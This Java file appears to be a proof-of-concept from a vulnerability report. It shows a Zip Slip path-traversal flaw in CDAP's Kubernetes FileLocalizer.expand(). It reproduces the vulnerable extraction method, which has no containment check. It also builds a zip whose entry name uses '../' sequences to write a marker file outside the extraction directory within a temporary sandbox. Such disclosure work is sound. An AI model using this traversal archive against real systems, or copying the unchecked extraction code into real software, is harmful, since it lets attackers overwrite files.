import java.io.IOException;
import java.io.InputStream;
import java.net.URI;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import java.util.zip.ZipOutputStream;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * Drives the REAL expand() method from
 * cdap-kubernetes/src/main/java/io/cdap/cdap/k8s/runtime/FileLocalizer.java (cdapio/cdap,
 * commit fb726c938e0668f1e8e30cb4734281033e86d968, 2026-11-24), extracted byte-exact
 * (sed -n '163,180p', self-verified via cmp - see extracted_FileLocalizer_expand.txt) with no
 * logic changes. This is the file-localizer FileLocalizer that runs inside CDAP's native
 * Kubernetes runtime's init container, for every program type (Service/Worker/Workflow/
 * MapReduce/Spark driver) when the master environment is Kubernetes with no remote provisioner
 * configured - a different, independent occurrence of the identical missing-check pattern
 * found in DataprocJobMain (see ZipSlipDataprocJobMainPoc.java), confirming this is not an
 * isolated one-off but a repeated gap across two unrelated runtime implementations, while the
 * third sibling (BundleJarUtil.unJar(), same codebase) has exactly this check.
 */
public class ZipSlipFileLocalizerPoc {

  private static final Logger LOG = LoggerFactory.getLogger(ZipSlipFileLocalizerPoc.class);

  // ===== BEGIN byte-exact extraction from FileLocalizer.java lines 163-180 =====
  // (the "stopped" instance field is declared here only because expand() references it;
  // its value - always false for this PoC - plays no part in the vulnerability.)

  private volatile boolean stopped = false;

  private Path expand(URI uri, InputStream inputStream, Path targetDir) throws IOException {
    LOG.debug("Localize and expand {} to {}", uri.toString(), targetDir);

    try (ZipInputStream is = new ZipInputStream(inputStream)) {
      Path targetPath = Files.createDirectories(targetDir);
      ZipEntry entry;
      while ((entry = is.getNextEntry()) != null && !stopped) {
        Path outputPath = targetPath.resolve(entry.getName());
        if (entry.isDirectory()) {
          Files.createDirectories(outputPath);
        } else {
          Files.createDirectories(outputPath.getParent());
          Files.copy(is, outputPath, StandardCopyOption.REPLACE_EXISTING);
        }
      }
    }
    return targetDir;
  }

  // ===== END byte-exact extraction =====

  public static void main(String[] args) throws Exception {
    Path sandbox = Files.createTempDirectory("filelocalizer-zipslip-poc");
    // Simulates the init container's own working directory inside the pod, where FileLocalizer
    // expands each "archive" LocalFile before the main container's process starts.
    Path targetDir = sandbox.resolve("pod-working-dir").resolve("plugins");
    Path victimMarker = sandbox.resolve("outside-extraction-dir").resolve("pwned.txt");

    int upCount = sandbox.relativize(targetDir).getNameCount();
    StringBuilder traversal = new StringBuilder();
    for (int i = 0; i < upCount; i++) {
      traversal.append("../");
    }
    String entryName = traversal.toString() + sandbox.relativize(victimMarker).toString();

    Path maliciousArchive = sandbox.resolve("payload.zip");
    try (ZipOutputStream zos = new ZipOutputStream(Files.newOutputStream(maliciousArchive))) {
      zos.putNextEntry(new ZipEntry(entryName));
      zos.write("written by the attacker, outside the pod's intended extraction directory\n"
          .getBytes("UTF-8"));
      zos.closeEntry();
    }

    System.out.println("Sandbox:          " + sandbox);
    System.out.println("Intended extract target: " + targetDir);
    System.out.println("Malicious entry name in the zip: " + entryName);
    System.out.println("Target file OUTSIDE the extraction dir: " + victimMarker);
    System.out.println("Exists before running expand()?  " + Files.exists(victimMarker));
    System.out.println();

    ZipSlipFileLocalizerPoc instance = new ZipSlipFileLocalizerPoc();
    try (InputStream is = Files.newInputStream(maliciousArchive)) {
      // This is the exact call FileLocalizer.run() makes for each isArchive()==true LocalFile:
      //   expand(localFile.getURI(), is, targetPath);
      instance.expand(maliciousArchive.toUri(), is, targetDir);
    }

    System.out.println();
    System.out.println("Exists AFTER running the real expand()? " + Files.exists(victimMarker));
    if (Files.exists(victimMarker)) {
      System.out.println("Content: " + Files.readString(victimMarker).trim());
      System.out.println();
      System.out.println("BUG CONFIRMED: the real, unmodified FileLocalizer.expand() wrote a file");
      System.out.println("outside its own intended extraction directory, entirely via the zip");
      System.out.println("entry's own name - no normalization, no containment check. Same missing");
      System.out.println("check as DataprocJobMain.unJar(), a second, independent occurrence.");
    } else {
      System.out.println("NOT reproduced.");
    }
  }
}
